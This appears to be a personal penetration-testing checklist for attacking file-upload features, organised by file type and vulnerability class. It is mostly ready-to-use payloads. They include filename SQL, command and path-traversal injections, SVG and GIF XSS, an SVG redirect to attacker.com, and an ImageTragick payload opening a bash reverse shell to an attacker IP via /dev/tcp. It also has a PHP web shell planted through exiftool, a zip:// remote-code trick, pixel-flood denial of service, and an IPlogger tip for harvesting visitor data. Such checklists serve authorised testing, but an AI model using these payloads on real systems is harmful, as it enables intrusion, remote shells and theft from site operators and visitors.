- [x] Identify File Uploads Points
- [ ] Vulnerable Filename
	- [x] XSS
	- [x]  SSRF
            - Abusing the "Upload from URL", if this image is going to be saved in some public site, you could also indicate a URL from [IPlogger](https://iplogger.org/invisible/) and steal information of every visitor.
	- [x]  SQL Injection
            - Set filename `'sleep(10).jpg`.
            - Set filename `sleep(10)-- -.jpg`.
	- [ ] LDAP
	- [x]  Command Injection
            - Set filename `; sleep 10;`
   - [x]  Directory Traversal
            - Set filename `../../etc/passwd/logo.png`
            - Set filename `../../../logo.png` as it might changed the website logo.
            - Symlink `ln -s /etc/passwd ./test` upload it and check if you can see passwd.
	- [ ] JS
	- [ ] Xpath


- [ ] SVG upload [SVG Cheat](https://github.com/allanlw/svg-cheatsheet)
	- [x] Stored XSS
		- [x] https://github.com/pranav77/XSS-using-SVG-file
		- [x] By payload https://github.com/pranav77/XSS-using-SVG-file
		- [x] XSS
			- ```xml 
			 <svgxmlns="http://www.w3.org/2000/svg"onload="alert(document.domain)"/>```
			-  ```xml
            <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>```
	- [x] SSRF
	- [x] XXE
		- [ ] [[XXE from Blind SSRF]] (Should be ssrf P4)
	- [ ] HTML Injection
	 - [x]  Open Redirect
		 -  Upload using `.svg` file	

            ```xml
            
            <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
            <svg
            onload="window.location='https://attacker.com'"
            xmlns="http://www.w3.org/2000/svg">
            <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
            </svg>
            
            ```


- [ ] GIF upload
	- [x] [XSS](https://github.com/0xspade/XSS-Gif-Payload.git)
		- `GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;`
	- [ ] SSRF

- [x] ZIP upload
	- For using payloads do `touch /tmp/evil.txt`
	- Create paylaods https://github.com/ptoomey3/evilarc
	- [ ] [zip-slip attack ](https://snyk.io/blog/zip-slip-vulnerability-cheat-sheet/)
	- [ ] [Code review](https://res.cloudinary.com/snyk/image/upload/v1530192988/blog/zip-slip-cheat-sheet.pdf)
	- [ ] [Code review2](https://github.com/snyk/zip-slip-vulnerability)

- [ ] PDF/PPTX upload
	- [ ] SSRF
	- [ ] BLIND XXE
	- [x] XSS

- [x] SWF (Flash player) upload
	- [x] XSS


- [x] XML upload
	- [x] XXE

- [ ] AVI upload
	- [ ] LFI
	- [ ] SSRF

- [ ] HTML/JS upload 
	- [x] HTML Injection
	- [x] XSS
	- [ ] Open Redirection

- [x] PNG / JPEG upload
	- [x] Pixel Flood attack (lottapixel.png)
		- Create 2 users A and B
		- Start uploading with lottapixel with A.
		- Symentaniously Upload normal image from B.
		- Of gives 502 then vulnerable.


- [x] Makdown Support
	- [x] [XSS](https://github.com/cujanovic/Markdown-XSS-Payloads/blob/master/Markdown-XSS-Payloads.txt)

- [ ] Image Processing
	- [ ]  [ImageTragic](https://www.onsecurity.io/blog/file-upload-checklist/#image-tragick-cve-2016-3714)

            ```
            push graphic-context
            viewbox 0 0 640 480
            fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
            pop graphic-context
            ```

	- If use of [PHP GD library](https://www.onsecurity.io/blog/file-upload-checklist/#bypassing-the-php-gd-library)

- [ ] XSS
	- `"><img src=x onerror=alert(1)>.png`
	- `%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E.png`
	- `"><img src=x onerror=alert(1)>`
	- [Tricks](https://enciphers.com/different-tricks-to-get-xss/)
	- [ ] XSS via MIME bypass image upload (See ex:4 of Tricks)
	- [ ] [[Exif metadata XSS]]
	- [ ] [HTML Injection XSS](https://drive.google.com/file/d/1xgNfsZ8-Roltnhgj_9zriTZvMI7Dckbb/view)


- [ ] [[CSV Injection]]

 - [ ] Misc
      - [ ]  Uploading `file.js` & `file.config` (web.config)
      - [x]  Pixel flood attack using image
      - [x]  DoS with a large values name: `1234...99.png`
      - [x]  Zip Slip
           - If a site accepts `.zip` file, upload `.php` and compress it into `.zip` and upload it. Now visit, `site.com/path?page=zip://path/file.zip%23rce.php`
      - [ ]  Image Shell
            - Exiftool is a great tool to view and manipulate exif-data. Then I will to rename the file `mv pic.jpg pic.php.jpg`

            ```php
            exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
            ```


- [ ] SSRF

- [ ] CSRF
- [x] Exif Image Data reverse shell
	- In `Author` metadata Lucideus Blog

- [ ] Metadata Leak



- [x] File Overwrite

- [ ] Server Side injection
- [ ] Open Redirection

- [ ] Bypasses
	- [ ] Content-type
	- [ ] n-extension
	- [ ] Client-side validation
	- [ ] Test for [null-byte injection](https://www.onsecurity.io/blog/file-upload-checklist/#null-byte-x00-injection).
		- [ ] [Magic bytes](https://www.onsecurity.io/blog/file-upload-checklist/#magic-byte-forgery)

- [ ] Check for [ffmpeg exploit](https://www.onsecurity.io/blog/file-upload-checklist/#ffmpeg-exploit-and-explanation)
- [ ] [.htaccess file upload](https://www.onsecurity.io/blog/file-upload-checklist/#uploading-a-htaccess-file)

- [ ] [[Unauthenticated File Upload Testing]] (DOS attack possible)
- [ ] [[Injecting into the request with Burp]]
- [ ] [[Test for Server Side Antivirus Scanning]]
- [x] [[Shell Upload]]
- [ ]  Is the server windows? Try adding a [trailing `.` to bypass extension blacklists](https://www.onsecurity.io/blog/file-upload-checklist/#trailing--in-windows), this dot will be removed automatically by the OS.
- [ ]  [[IIS server and Apache file upload whitelist bypass]]
- [ ]  [[IIS server and Apache file upload blacklist bypass]]
- [ ]   Can custom polyglots be developed to bypass specific filters?
- [ ]  Check for the acceptance of double extensions on uploaded files.